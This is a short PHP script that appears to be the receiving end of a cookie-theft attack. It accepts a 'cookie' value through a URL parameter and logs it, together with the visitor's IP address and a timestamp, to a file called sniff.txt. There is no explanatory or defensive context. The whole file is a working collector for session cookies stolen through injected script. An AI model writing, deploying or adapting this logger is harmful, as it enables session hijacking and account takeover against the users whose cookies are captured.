<?php
if (isset($_GET['cookie']))
{
$text = "New cookie accept from ". $_SERVER['REMOTE_ADDR'] ." at ". date('l jS \of F Y h:i:s A');
$text .= "\n".str_repeat("=", 22) . "\n" . $_GET['cookie']."\n".str_repeat("=", 22)."\n";
$file = fopen("sniff.txt", "a");
fwrite($file, $text);
fclose($file);
}
?>
